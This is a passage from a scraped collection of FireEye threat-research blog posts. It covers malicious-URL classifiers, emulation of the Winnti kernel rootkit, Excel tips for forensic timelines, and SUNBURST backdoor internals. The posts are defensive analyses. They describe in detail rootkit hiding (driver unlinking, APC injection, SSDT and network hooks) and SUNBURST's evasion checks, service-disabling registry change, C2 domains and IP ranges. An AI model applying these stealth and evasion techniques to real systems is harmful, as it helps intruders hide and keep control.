weights over the first 16 layers of the Transformer and trained for 15 epochs on the binary classification task. The ROC curve shown in Figure 2 compares the performance of these four training regimes. Here, our baseline DecodeToLabel model (red) yielded a ROC curve with 0.9484 AUC, while the MixedObjective model (green) slightly outperformed the baseline with an AUC of 0.956. Interestingly, both of the fine-tuning models yielded poor classification results, which is counter to the established practice of these Transformer models in the NLP domain. Figure 2: ROC curves for four URL Transformer training regimes To assess the relative efficacy of our Transformer models on this dataset, we also fit several other types of benchmark models developed for URL classification: (1) a Random Forest model on SME-derived features, (2) a 1D Convolutional Neural Network (CNN) model on character embeddings, and (3) a Long Short-Term Memory (LSTM) neural network on character embeddings. Details of these models can be found in our white paper , however we find that our top performing Transformer model performs on-par with the best performing non-Transformer baseline (a 1D CNN model), which perhaps indicates that the long-range dependencies typically learned by Transformer models are not as useful in the case of malicious URL detection. Figure 3: ROC curves comparing URL Transformer to other benchmark URL classification models Summary Our experiments suggest that Transformers can achieve performance comparable to or better than that of other top-performing models for URL classification, though the details of how to achieve that performance differ from common practice. Contrary to findings from the NLP domain , wherein self-supervised pre-training substantially enhances performance in a fine-tuned classification task, similar pretraining approaches actually diminish performance for malicious URL detection. This suggests that the next character prediction task has too little apparent correlation with the task of malicious/benign prediction for effective/stable transfer. Interestingly, utilizing next-character prediction as an auxiliary loss function in conjunction with a malicious/benign loss yields improvements over training solely to predict the label. We hypothesize that while pre-training leads to a relatively poor generative model due to randomized content in the URLs within our dataset, a malicious/benign loss may serve to better condition the generative model learned by the next-character prediction task, distilling a subset of relevant information. It may also be the case that the long-distance relationships that are key to the generative pre-training task are not as important for the final malicious URL classification, as evidenced by the performance of the 1D CNN model. Note that we did not perform a rigorous hyperparameter search for our Transformer, since this research was primarily concerned with loss functions and training regimes. Therefore, it is still an open question as to whether a more optimal architecture, specifically designed for this classification task, could substantially outperform the models described here. While our URL dataset is not representative of all data in the cyber security space, the difficulty of obtaining a readily fine-tuned model from self-supervised pre-training suggests that this approach is unlikely to work well for training Transformers on longer sequences or sequences with lesser resemblance to natural language (e.g., PE files), but an auxiliary loss might work. Details about this research and additional results can be found in our associated white paper . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/01/emulation-of-kernel-mode-rootkits-with-speakeasy.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-01-20",
                    "source": "www.fireeye.com"
                },
                "text": "In August 2020, we released a blog post about how the Speakeasy emulation framework can be used to emulate user mode malware such as shellcode. If you haven’t had a chance, give the post a read today . In addition to user mode emulation, Speakeasy also supports emulation of kernel mode Windows binaries. When malware authors employ kernel mode malware, it will often be in the form of a device driver whose end goal is total compromise of an infected system. The malware most often doesn’t interact with hardware and instead leverages kernel mode to fully compromise the system and remain hidden. Challenges With Dynamically Analyzing Kernel Malware Ideally, a kernel mode sample can be reversed statically using tools such as disassemblers. However, binary packers just as easily obfuscate kernel malware as they do user mode samples. Additionally, static analysis is often expensive and time consuming. If our goal is to automatically analyze many variants of the same malware family, it makes sense to dynamically analyze malicious driver samples. Dynamic analysis of kernel mode malware can be more involved than with user mode samples. In order to debug kernel malware, a proper environment needs to be created. This usually involves setting up two separate virtual machines as debugger and debugee. The malware can then be loaded as an on-demand kernel service where the driver can be debugged remotely with a tool such as WinDbg. Several sandbox style applications exist that use hooking or other monitoring techniques but typically target user mode applications. Having similar sandbox monitoring work for kernel mode code would require deep system level hooks that would likely produce significant noise. Driver Emulation Emulation has proven to be an effective analysis technique for malicious drivers. No custom setup is required, and drivers can be emulated at scale. In addition, maximum code coverage is easier to achieve than in a sandbox environment. Often, rootkits may expose malicious functionality via I/O request packet (IRP) handlers (or other callbacks). On a normal Windows system these routines are executed when other applications or devices send input/output requests to the driver. This includes common tasks such as reading, writing, or sending device I/O control (IOCTLs) to a driver to execute some type of functionality. Using emulation, these entry points can be called directly with doped IRP packets in order to identify as much functionality as possible in the rootkit. As we discussed in the first Speakeasy blog post, additional entry points are emulated as they are discovered. A driver’s DriverMain entry point is responsible for initializing a function dispatch table that is called to handle I/O requests. Speakeasy will attempt to emulate each of these functions after the main entry point has completed by supplying a dummy IRP. Additionally, any system threads or work items that are created are sequentially emulated in order to get as much code coverage as possible. Emulating a Kernel Mode Implant In this blog post, we will show an example of Speakeasy’s effectiveness at emulating a real kernel mode implant family publicly named Winnti. This sample was chosen despite its age because it transparently implements some classic rootkit functionality. The goal of this post is not to discuss the analysis of the malware itself as it is fairly antiquated. Rather, we will focus on the events that are captured during emulation. The Winnti sample we will be analyzing has SHA256 hash c465238c9da9c5ea5994fe9faf1b5835767210132db0ce9a79cb1195851a36fb and the original file name tcprelay.sys . For most of this post, we will be examining the emulation report generated by Speakeasy. Note: many techniques employed by this 32-bit rootkit will not work on modern 64-bit versions of Windows due to Kernel Patch Protection (PatchGuard) which protects against modification of critical kernel data structures. To start, we will instruct Speakeasy to emulate the kernel driver using the command line shown in Figure 1. We instruct Speakeasy to create a full memory dump (using the “-d” flag) so we can acquire memory later. We supply the memory tracing flag (“-m”) which will log all memory reads and writes performed by the malware. This is useful for detecting things like hooking and direct kernel object manipulation (DKOM). Figure 1: Command line used to emulate the malicious driver Speakeasy will then begin emulating the malware’s DriverEntry function. The entry point of a driver is responsible for setting up passive callback routines that will service user mode I/O requests as well as callbacks used for device addition, removal, and unloading. Reviewing the emulation report for the malware’s DriverEntry function (identified in the JSON report with an “ep_type” of “entry_point”), shows that the malware finds the base address of the Windows kernel. The malware does this by using the ZwQuerySystemInformation API to locate the base address for all kernel modules and then looking for one named “ntoskrnl.exe”. The malware then manually finds the address of the PsCreateSystemThread API. This is then used to spin up a system thread to perform its actual functionality. Figure 2 shows the APIs called from the malware's entry point. Figure 2: Key functionality in the tcprelay.sys entry point Hiding the Driver Object The malware attempts to hide itself before executing its main system thread. The malware first looks up the “DriverSection” field in its own DRIVER_OBJECT structure. This field holds a linked list containing all loaded kernel modules and the malware attempts to unlink itself to hide from APIs that list loaded drivers. In the “mem_access” field in the Speakeasy report shown in Figure 3, we can see two memory writes to the DriverSection entries before and after itself which will remove itself from the linked list. Figure 3: Memory write events representing the tcprelay.sys malware attempting to unlink itself in order to hide As noted in the original Speakeasy blog post , when threads or other dynamic entry points are created at runtime, the framework will follow them for emulation. In this case, the malware created a system thread and Speakeasy automatically emulated it. Moving on to the newly created thread (identified by an “ep_type” of “system_thread”), we can see the malware begin its real functionality. The malware begins by enumerating all running processes on the host, looking for the service controller process named services.exe. It's important to note that the process listing that gets returned to the emulated samples is configurable via JSON config files supplied at runtime. For more information on these configuration options please see the Speakeasy README on our GitHub repository . An example of this configurable process listing is shown in Figure 4. Figure 4: Process listing configuration field supplied to Speakeasy Pivoting to User Mode Once the malware locates the services.exe process, it will attach to its process context and begin inspecting user mode memory in order to locate the addresses of exported user mode functions. The malware does this so it can later inject an encoded, memory-resident DLL into the services.exe process. Figure 5 shows the APIs used by the rootkit to resolve its user mode exports. Figure 5: Logged APIs used by tcprelay.sys rootkit to resolve exports for its user mode implant Once the exported functions are resolved, the rootkit is ready to inject the user mode DLL component. Next, the malware manually copies the in-memory DLL into the services.exe process address space. These memory write events are captured and shown in Figure 6. Figure 6: Memory write events captured while copying the user mode implant into services.exe A common technique that rootkits use to execute user mode code involves a Windows feature known as Asynchronous Procedure Calls (APC). APCs are functions that execute asynchronously within the context of a supplied thread. Using APCs allows kernel mode applications to queue code to run within a thread’s user mode context. Malware often wants to inject into user mode since much of the common functionality (such as network communication) within Windows can be more easily accessed. In addition, by running in user mode, there is less risk of being detected in the event of faulty code bug-checking the entire machine. In order to queue an APC to fire in user mode, the malware must locate a thread in an “alertable” state. Threads are said to be alertable when they relinquish their execution quantum to the kernel thread scheduler and notify the kernel that they are able to dispatch APCs. The malware searches for threads within the services.exe process and once it detects one that’s alertable it will allocate memory for the DLL to inject then queue an APC to execute it. Speakeasy emulates all kernel structures involved in this process, specifically the executive thread object ( ETHREAD ) structures that are allocated for every thread on a Windows system. Malware may attempt to grovel through this opaque structure to identify when a thread’s alertable flag is set (and therefore a valid candidate for an APC). Figure 7 shows the memory read event that was logged when the Winnti malware manually parsed an ETHREAD structure in the services.exe process to confirm it was alertable. At the time of this writing, all threads within the emulator present themselves as alertable by default. Figure 7: Event logged when the tcprelay.sys malware confirmed a thread was alertable Next, the malware can execute any user mode code it wants using this thread object. The undocumented functions KeInitializeApc and KeInsertQueueApc will initialize and execute a user mode APC respectively. Figure 8 shows the API set that the malware uses to inject a user mode module into the services.exe process. The malware executes a shellcode stub as the target of the APC that will then execute a loader for the injected DLL. All of this can be recovered from the memory dump package and analyzed later. Figure 8: Logged APIs used by tcprelay.sys rootkit to inject into user mode via an APC Network Hooks After injecting into user mode, the kernel component will attempt to install network obfuscation hooks (presumably to hide the user mode implant). Speakeasy tracks and tags all memory within the emulation space. In the context of kernel mode emulation, this includes all kernel objects (e.g. Driver and Device objects, and the kernel modules themselves). Immediately after we observe the malware inject its user mode implant, we see it begin to attempt to hook kernel components. This was confirmed during static analysis to be used for network hiding. The memory access section of the emulation report reveals that the malware modified the netio.sys driver, specifically code within the exported function named NsiEnumerateObjectsAllParametersEx . This function is ultimately called when a user on the system runs the “netstat” command and it is likely that the malware is hooking this function in order to hide connected network ports on the infected system. This inline hook was identified by the event captured in Figure 9. Figure 9: Inline function hook set by the malware to hide network connections In addition, the malware hooks the Tcpip driver object in order to accomplish additional network hiding. Specifically, the malware hooks the IRP_MJ_DEVICE_CONTROL handler for the Tcpip driver. User mode code may send IOCTL codes to this function when querying for active connections. This type of hook can be easily identified with Speakeasy by looking for memory writes to critical kernel objects as shown in Figure 10. Figure 10: Memory write event used to hook the Tcpip network driver System Service Dispatch Table Hooks Finally, the rootkit will attempt to hide itself using the nearly ancient technique of system service dispatch table (SSDT) patching. Speakeasy allocates a fake SSDT so malware can interact with it. The SSDT is a function table that exposes kernel functionality to user mode code. The event in Figure 11 shows that the SSDT structure was modified at runtime. Figure 11: SSDT hook detected by Speakeasy If we look at the malware in IDA Pro, we can confirm that the malware patches the SSDT entry for the ZwQueryDirectoryFile and ZwEnumerateKey APIs that it uses to hide itself from file system and registry analysis. The SSDT patch function is shown in Figure 12. Figure 12: File hiding SSDT patching function shown in IDA Pro After setting up these hooks, the system thread will exit. The other entry points (such as the IRP handlers and DriverUnload routines) in the driver are less interesting and contain mostly boilerplate driver code. Acquiring the Injected User Mode Implant Now that we have a good idea what the driver does to hide itself on the system, we can use the memory dumps created by Speakeasy to acquire the injected DLL discussed earlier. Opening the zip file we created at emulation time, we can find the memory tag referenced in Figure 6. We quickly confirm the memory block has a valid PE header and it successfully loads into IDA Pro as shown in Figure 13. Figure 13: Injected user mode DLL recovered from Speakeasy memory dump Conclusion In this blog post, we discussed how Speakeasy can be effective at automatically identifying rootkit activity from the kernel mode binary. Speakeasy can be used to quickly triage kernel binaries that may otherwise be difficult to dynamically analyze. For more information and to check out the code, head over to our GitHub repository . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/12/tips-and-tricks-to-analyze-data-with-microsoft-excel.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2019-12-03",
                    "source": "www.fireeye.com"
                },
                "text": "Incident response investigations don’t always involve standard host-based artifacts with fully developed parsing and analysis tools. At FireEye Mandiant, we frequently encounter incidents that involve a number of systems and solutions that utilize custom logging or artifact data. Determining what happened in an incident involves taking a dive into whatever type of data we are presented with, learning about it, and developing an efficient way to analyze the important evidence. One of the most effective tools to perform this type of analysis is one that is in almost everyone’s toolkit: Microsoft Excel. In this article we will detail some tips and tricks with Excel to perform analysis when presented with any type of data. Summarizing Verbose Artifacts Tools such as FireEye Redline include handy timeline features to combine multiple artifact types into one concise timeline. When we use individual parsers or custom artifact formats, it may be tricky to view multiple types of data in the same view. Normalizing artifact data with Excel to a specific set of easy-to-use columns makes for a smooth combination of different artifact types. Consider trying to review parsed file system, event log, and Registry data in the same view using the following data. $SI Created $SI Modified File Name File Path File Size File MD5 File Attributes File Deleted 2019-10-14 23:13:04 2019-10-14 23:33:45 Default.rdp C:\\Users\\ attacker\\Documents\\ 485 c482e563df19a40 1941c99888ac2f525 Archive FALSE Event Gen Time Event ID Event Message Event Category Event User Event System 2019-10-14 23:13:06 4648 A logon was attempted using explicit credentials. Subject: Security ID:  DomainCorp\\Administrator Account Name:  Administrator Account Domain:  DomainCorp Logon ID:  0x1b38fe Logon GUID:  {00000000-0000-0000-0000-000000000000} Account Whose Credentials Were Used: Account Name:  VictimUser Account Domain:  DomainCorp Logon GUID:  {00000000-0000-0000-0000-000000000000} Target Server: Target Server Name: DestinationServer Additional Information: Process Information: Process ID:  0x5ac Process Name:  C:\\Program Files\\Internet Explorer\\iexplore.exe Network Information: Network Address: - Port:   - Logon Administrator SourceSystem KeyModified Key Path KeyName ValueName ValueText Type 2019-10-14 23:33:46 HKEY_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\ DestinationServer UsernameHInt VictimUser REG_SZ Since these raw artifact data sets have different column headings and data types, they would be difficult to review in one timeline. If we format the data using Excel string concatenation, we can make the data easy to combine into a single timeline view. To format the data, we can use the “&” operation with a function to join information we may need into a “Summary” field. An example command to join the relevant file system data delimited by ampersands could be “=D2 & \" | \" & C2 & \" | \" & E2 & \" | \" & F2 & \" | \" & G2 & \" | \" & H2”. Combining this format function with a “Timestamp” and “Timestamp Type” column will complete everything we need for streamlined analysis. Timestamp Timestamp Type Event 2019-10-14 23:13:04 $SI Created C:\\Users\\attacker\\Documents\\ | Default.rdp | 485 | c482e563df19a401941c99888ac2f525  | Archive | FALSE 2019-10-14 23:13:06 Event Gen Time 4648 | A logon was attempted using explicit credentials. Subject: Security ID:  DomainCorp\\Administrator Account Name:  Administrator Account Domain:  DomainCorp Logon ID:  0x1b38fe Logon GUID:  {00000000-0000-0000-0000-000000000000} Account Whose Credentials Were Used: Account Name:  VictimUser Account Domain:  DomainCorp Logon GUID:  {00000000-0000-0000-0000-000000000000} Target Server: Target Server Name: DestinationServer Additional Information: Process Information: Process ID:  0x5ac Process Name:  C:\\Program Files\\Internet Explorer\\iexplore.exe Network Information: Network Address: - Port:   - | Logon | Administrator | SourceSystem 2019-10-14 23:33:45 $SI Modified C:\\Users\\attacker\\Documents\\ | Default.rdp | 485 | c482e563df19a401941c99888ac2f525  | Archive | FALSE 2019-10-14 23:33:46 KeyModified HKEY_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\ | DestinationServer | UsernameHInt | VictimUser After sorting by timestamp, we can see evidence of the “DomainCorp\\Administrator” account connecting from “SourceSystem” to “DestinationServer” with the “DomainCorp\\VictimUser” account via RDP across three artifact types. Time Zone Conversions One of the most critical elements of incident response and forensic analysis is timelining. Temporal analysis will often turn up new evidence by identifying events that precede or follow an event of interest. Equally critical is producing an accurate timeline for reporting. Timestamps and time zones can be frustrating, and things can get confusing when the systems being analyzed span various time zones. Mandiant tracks all timestamps in Coordinated Universal Time (UTC) format in its investigations to eliminate any confusion of both time zones and time adjustments such as daylight savings and regional summer seasons. Of course, various sources of evidence do not always log time the same way. Some may be local time, some may be UTC, and as mentioned, data from sources in various geographical locations complicates things further. When compiling timelines, it is important to first know whether the evidence source is logged in UTC or local time. If it is logged in local time, we need to confirm which local time zone the evidence source is from. Then we can use the Excel TIME()  formula to convert timestamps to UTC as needed. This example scenario is based on a real investigation where the target organization was compromised via phishing email, and employee direct deposit information was changed via an internal HR application. In this situation, we have three log sources: email receipt logs, application logins, and application web logs. The email logs are recorded in UTC and contain the following information: The application logins are recorded in Eastern Daylight Time (EDT) and contain the following: The application web logs are also recorded in Eastern Daylight Time (EDT) and contain the following: To take this information and turn it into a master timeline, we can use the CONCAT function (an alternative to the ampersand concatenation used previously) to make a summary of the columns in one cell for each log source, such as this example formula for the email receipt logs: This is where checking our time zones for each data source is critical. If we took the information as it is presented in the logs and assumed the timestamps were all in the same time zone and created a timeline of this information, it would look like this: As it stands the previous screenshot, we have some login events to the HR application, which may look like normal activity for the employees. Then later in the day, they receive some suspicious emails. If this were hundreds of lines of log events, we would risk the login and web log events being overlooked as the time of activity precedes our suspected initial compromise vector by a few hours. If this were a timeline used for reporting, it would also be inaccurate. When we know which time zone our log sources are in, we can adjust the timestamps accordingly to reflect UTC. In this case, we confirmed through testing that the application logins and web logs are recorded in EDT, which is four hours behind UTC, or “UTC-4”. To change these to UTC time, we just need to add four hours to the time. The Excel TIME function makes this easy. We can just add a column to the existing tables, and in the first cell we type “=A2+TIME(4,0,0)”. Breaking this down: =A2 Reference cell A2 (in this case our EDT timestamp). Note this is not an absolute reference, so we can use this formula for the rest of the rows. +TIME This tells Excel to take the value of the data in cell A2 as a “time” value type and add the following amount of time to it: (4,0,0) The TIME function in this instance requires three values, which are, from left to right: hours, minutes, seconds. In this example, we are adding 4 hours, 0 minutes, and 0 seconds. Now we have a formula that takes the EDT timestamp and adds four hours to it to make it UTC. Then we can replicate this formula for the rest of the table. The end result looks like this: When we have all of our logs in the same time zone, we are ready to compile our master timeline. Taking the UTC timestamps and the summary events we made, our new, accurate timeline looks like this: Now we can clearly see suspicious emails sent to (fictional) employees Austin and Dave. A few minutes later, Austin’s account logs into the HR application and adds a new bank account. After this, we see the same email sent to Jake. Soon after this, Jake’s account logs into the HR application and adds the same bank account information as Austin’s. Converting all our data sources to the same time zone with Excel allowed us to quickly link these events together and easily identify what the attacker did. Additionally, it provided us with more indicators, such as the known-bad bank account number to search for in the rest of the logs. Pro Tip: Be sure to account for log data spanning over changes in UTC offset due to regional events such as daylight savings or summer seasons. For example, local time zone adjustments will need to change for logs in United States Eastern Time from Virginia, USA from +TIME(5,0,0) to +TIME(4,0,0) the first weekend in March every year and back from +TIME(4,0,0) to +TIME(5,0,0) the first weekend in November to account for daylight and standard shifts . CountIf for Log Baselining When reviewing logs that record authentication in the form of a user account and timestamp, we can use COUNTIF to establish simple baselines to identify those user accounts with inconsistent activity. In the example of user logons that follows, we'll use the formula \"=COUNTIF($B$2:$B$25,B2)\" to establish a historical baseline. Here is a breakdown of the parameters for this COUNTIF formula located in C2 in our example: COUNTIF This Excel formula counts how many times a value exists in a range of cells. $B$2:$B$25 This is the entire range of all cells, B2 through B25, that we want to use as a range to search for a specific value. Note the use of \"$\" to ensure that the start and end of the range are an absolute reference and are not automatically updated by Excel if we copy this formula to other cells. B2 This is the cell that contains the value we want to search for and count occurrences of in our range of $B$2:$B$25. Note that this parameter is not an absolute reference with a preceding \"$\". This allows us to fill the formula down through all rows and ensure that we are counting the applicable user name. To summarize, this formula will search the username column of all logon data and count how many times the user of each logon has logged on in total across all data points. When most user accounts log on regularly, a compromised account being used to logon for the first time may clearly stand out when reviewing total log on counts. If we have a specific time frame in mind, it may be helpful to know which accounts first logged on during that time. The COUNTIF formula can help track accounts through time to identify their first log on which can help identify rarely used credentials that were abused for a limited time frame. We'll start with the formula \"=COUNTIF($B$2:$B2,B2)\" in cell D3. Here is a breakdown of the parameters  for this COUNTIF formula. Note that the use of \"$\" for absolute referencing is slightly different for the range used, and that is an importance nuance: COUNTIF This Excel formula counts how many times a value exists in a range of cells. $B$2:$B2 This is the range of cells, B2 through B2, that we want to start with. Since we want to increase our range as we go through the rows of the log data, the ending cell row number (2 in this example) is not made absolute. As we fill this formula down through the rest of our log data, it will automatically expand the range to include the current log record and all previous logs. B2 This cell contains the value we want to search for and provides a count of occurrences found in our defined range. Note that this parameter B2 is not an absolute reference with a preceding \"$\". This allows us to fill the formula down through all rows and ensure that we are counting the applicable user name. To summarize, this formula will search the username column of all logon data before and including the current log and count how many times the user of each logon has logged on up to that point in time. The following example illustrates how Excel automatically updated the range for D15 to $B$2:$B15 using the fill handle . To help visualize a large data set, let's add color scale conditional formatting to each row individually. To do so: Select only the cells we want to compare with the color scale (such as D2 to D25). On the Home menu, click the Conditional Formatting button in the Styles area. Click Color Scales. Click the type of color scale we would like to use. The following examples set the lowest values to red and the highest values to green. We can see how: Users with lower authentication counts contrast against users with more authentications. The first authentication times of users stand out in red. Whichever colors are used, be careful not to assume that one color, such as green, implies safety and another color, such as red, implies maliciousness. Conclusion The techniques described in this post are just a few ways to utilize Excel to perform analysis on arbitrary data. While these techniques may not leverage some of the more powerful features of Excel, as with any variety of skill set, mastering the fundamentals enables us to perform at a higher level. Employing fundamental Excel analysis techniques can empower an investigator to work through analysis of any presented data type as efficiently as possible. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/12/sunburst-additional-technical-details.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-12-24",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye has discovered additional details about the SUNBURST backdoor since our initial publication on Dec. 13, 2020. Before diving into the technical depth of this malware, we recommend readers familiarize themselves with our blog post about the SolarWinds supply chain compromise , which revealed a global intrusion campaign by a sophisticated threat actor we are currently tracking as UNC2452. SUNBURST is a trojanized version of a digitally signed SolarWinds Orion plugin called SolarWinds.Orion.Core.BusinessLayer.dll . The plugin contains a backdoor that communicates via HTTP to third party servers. After an initial dormant period of up to two weeks, SUNBURST may retrieve and execute commands that instruct the backdoor to transfer files, execute files, profile the system, reboot the system, and disable system services. The malware's network traffic attempts to blend in with legitimate SolarWinds activity by imitating the Orion Improvement Program (OIP) protocol and persistent state data is stored within legitimate plugin configuration files. The backdoor uses multiple obfuscated blocklists to identify processes, services, and drivers associated with forensic and anti-virus tools. In this post, the following topics are covered in greater detail: Anti-Analysis Environment Checks and Blocklists Domain Generation Algorithm and Variations Command and Control (C2) behaviors for DNS A and CNAME records Malware modes of operation Anti-Analysis Environment Checks Before reaching out to its C2 server, SUNBURST performs numerous checks to ensure no analysis tools are present. It checks process names, file write timestamps, and Active Directory (AD) domains before proceeding. We believe that these checks helped SUNBURST evade detection by anti-virus software and forensic investigators for seven months after its introduction to the SolarWinds Orion supply chain. First, the backdoor verifies that the lowercase name of the current process is solarwinds.businesslayerhost . UNC2452 avoided including this string directly in the source code by computing a hash of the string and comparing the result to the 64-bit number 17291806236368054941 . The hash value is calculated as a standard FNV-1A 64-bit hash with an additional XOR by the 64-bit number 6605813339339102567 . The additional XOR operation forces malware analysts to develop custom tools to brute force the hash preimage. Next, the backdoor only executes if the filesystem last write time of the .NET assembly SolarWinds.Orion.Core.BusinessLayer.dll is at least 12 to 14 days prior to the current time. The exact threshold is selected randomly from this interval. In other words, SUNBURST lays low for almost two weeks before raising its head. If the timestamp check fails, the backdoor will execute again at a random later time when it is invoked by a legitimate recurring background task. Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to ensure only one instance of the backdoor is running. If the named pipe already exists, the malware exits. SUNBURST stores its configuration in the legitimate SolarWinds.Orion.Core.BusinessLayer.dll.config file. It repurposes two existing settings in the appSettings section: ReportWatcherRetry and ReportWatcherPostpone . During initialization, the backdoor determines if the ReportWatcherRetry setting is the value 3 . This value indicates the malware has been deactivated and will no longer perform any network activity. As we describe later, UNC2452 can command the backdoor to disable itself. This feature may be utilized when the operator determines the victim is not of interest or that they’ve completed their mission. When investigating a system compromised by SUNBURST, review this setting to determine if the backdoor has been disabled. Note, the presence of this value does not offer proof the actor did not further compromise the environment before disabling SUNBURST. The backdoor also determines if the system is joined to an Active Directory (AD) domain and, if so, retrieves the domain name. Execution ceases if the system is not joined to an AD domain. SUNBURST checks the AD domain name against a blocklist and halts execution if it contains one of the following values: swdev.local emea.sales pci.local apac.lab swdev.dmz cork.lab saas.swi dmz.local lab.local dev.local lab.rio lab.brno lab.na test solarwinds We suspect these hard-coded AD domains may be SolarWinds internal domains that UNC2452 wanted to avoid. Finally, SUNBURST verifies the system has internet connectivity by ensuring it can resolve the DNS name api.solarwinds.com . Otherwise, execution stops and retries at a random later time. Anti-Analysis Blocklists SUNBURST's behavior is affected by the presence of malware analysis and security software. To disguise the strings used to detect these security tools, UNC2452 calculated and embedded a hash value for each string. While it is trivial for the backdoor to check for the existence of a hashed process name, it is computationally expensive to determine what string a hash value corresponds to (the “preimage”). However, thanks to some hard work by members of the information security community, the hashes have been successfully brute-forced. The list of hashes and their corresponding strings can be viewed at this FireEye GitHub page . SUNBURST uses the aforementioned FNV-1A plus XOR algorithm to compute the hash of each process name, service name, and driver filename on the system. If a blocklisted process or driver name is found, SUNBURST pauses and tries again later. The backdoor continues past this check only when there are no processes nor drivers from the blocklist present. If a blocklisted service is found, SUNBURST attempts to disable the blocklisted service by manipulating the service configuration in the Windows Registry. It sets the registry value HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start to the value 4 , which corresponds to SERVICE_DISABLED . As a result, the blocklisted service is disabled on the next power cycle . This means the presence of a blocklisted service on a compromised host does not make a system immune to SUNBURST. After the registry modification is made, SUNBURST updates the ReportWatcherPostpone configuration value to reflect the service it disabled. Then, the backdoor pauses and retries the process and service blocklist checks at a later time. Subsequent service blocklist checks skip services already present in the ReportWatcherPostpone configuration key. SUNBURST will not treat the services it has disabled as members of the blocklist anymore. Therefore, during an incident response, forensic teams should consider recovering and decoding this configuration key to parse out which services SUNBURST attempted to disable. Domain Generation Algorithm In this section we describe how SUNBURST uses an intermediary command and control (C2) coordinator to retrieve its final C2 server. The C2 coordinator instructs the backdoor to continue or halt beaconing. It also redirects SUNBURST to its final C2 server via DNS CNAME records. We believe this enables UNC2452 to compartmentalize their operations, limiting the network infrastructure shared among victims. The C2 coordinator is implemented as the authoritative DNS server for the avsvmcloud[.]com domain. To communicate with the C2 coordinator, SUNBURST uses a Domain Generation Algorithm (DGA) to construct subdomains of avsvmcloud[.]com and resolves the fully qualified domain names (FQDN) using the system DNS client. The backdoor interprets the DNS responses in an unusual way to receive orders from the C2 coordinator. The DGA generates subdomains with the following DNS suffixes to create the FQDN: .appsync-api.eu-west-1[.]avsvmcloud[.]com .appsync-api.us-west-2[.]avsvmcloud[.]com .appsync-api.us-east-1[.]avsvmcloud[.]com .appsync-api.us-east-2[.]avsvmcloud[.]com A method named Update is responsible for initializing cryptographic helpers for the generation of these random-looking C2 subdomains. Subdomains are generated by concatenating an encoded user ID with an encoding of the system's domain name. The C2 coordinator can recover the victim domain name from the encoded data and likely uses this to route SUNBURST to its final C2 server. A user ID is generated based on three values: MAC address of the first available, non-loopback network interface Domain name HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid value SUNBURST takes the MD5 hash of these combined values and encodes it using a custom XOR scheme. We believe this value is used by UNC2452 to track unique victims. SUNBURST uses four different forms of subdomains to signify the operating mode of the backdoor. Each form contains slightly different information. However, in two of the forms, investigators can recover the domain names of victim organizations. We recommend reviewing DNS logs to confirm the presence of a victim’s domain in SUNBURST C2 coordinator traffic. When SUNBURST is in its initial mode, it embeds the domain of the victim organization in its DGA-generated domain prefix. Once the malware transitions to an “active” mode, the malware uses the other two forms of subdomains. These do not include the AD domain, but instead include encodings of either the list of running and stopped services or a timestamp. The open-source community has done a fantastic job reverse engineering many of the subdomain forms. While we are not aware of any public decoder scripts that reverse all four possible encodings, most decoders focus on recovering the most useful information: the user ID and domain name embedded in the subdomains. We recommend that incident responders for victim organizations with access to DNS logs use these tools to confirm their AD domains are not embedded within SUNBURST generated DNS subdomains. Note that this does not indicate follow-on activity. The following sources may be referenced for decoding such domains: https://securelist.com/sunburst-connecting-the-dots-in-the-dns-requests/99862/ https://github.com/RedDrip7/SunBurst_DGA_Decode https://blog.cloudflare.com/a-quirk-in-the-sunburst-dga-algorithm/ Figure 1: Diagram of actor operations and usage of SUNBURST Command and Control SUNBURST uses a two-part C2 protocol that involves both DNS and HTTP. In “passive” mode, the backdoor communicates with its C2 coordinator via DNS and receives high-level updates to its state. For example, the C2 coordinator may tell the backdoor to go to sleep or spring into action. When the backdoor is in “active” mode, it communicates via HTTP to its final C2 server and receives detailed commands such as “spawn a process” or “transfer a file”. DNS C2 and the C2 Coordinator Protocol When communicating with the C2 coordinator, the backdoor continuously generates domains via its DGA. The backdoor delays execution for random intervals between generating domains. In some cases, this delay is up to 9 hours. If the C2 coordinator responds with a DNS A record, SUNBURST checks the resolved address against a hard-coded list of IP address blocks. If the address falls within a block, the backdoor transitions into an associated mode. The backdoor starts in the “passive” mode where it does nothing but check blocklists, sleep, and beacon via DNS until a transition is seen. Other modes are “active”, in which the malware communicates via HTTP, and “disabled”, in which the malware is permanently disabled. These modes and transitions are defined in the Modes of Operation section. The C2 coordinator may also respond with a DNS CNAME response. In this case, the malware uses the pointed-to domain from the CNAME response for HTTPS C2 communications. SUNBURST starts a thread to handle command execution and further C2 HTTP(S) callouts. As an investigator, if you see CNAME resolutions for subdomains of avsvmcloud[.]com, it‘s possible that UNC2452 initiated follow-on C2 within the environment. Note, the malware must receive a DNS A record response pointing to one of the following subnets immediately prior to receiving a DNS CNAME response. Otherwise, the CNAME resolution will be ignored and treated as an error. In addition, for these subnets, the least-significant bytes from the A record IP address are parsed to obtain configuration data such as the proxy method to use, the URI scheme to use, and a delay value used in the HTTP thread. 18.130.0.0/16 99.79.0.0/16 184.72.0.0/15 Subsequent DNS A record responses in the following subnet ranges cause the DGA beaconing to continue. 8.18.144.0/23 18.130.0.0/16 71.152.53.0/24 99.79.0.0/16 87.238.80.0/21 199.201.117.0/24 184.72.0.0/15 Otherwise, subsequent DNS A record responses in the following subnet ranges cause SUNBURST to terminate and update the configuration key ReportWatcherRetry to a value that prevents further execution. This is the killswitch. 10.0.0.0/8 fc00:: - fe00:: 96.31.172.0/24 172.16.0.0/12 fec0:: - ffc0:: 131.228.12.0/22 192.168.0.0/16 ff00:: - ff00:: 144.86.226.0/24 224.0.0.0/3 20.140.0.0/15 While in “active” mode, the 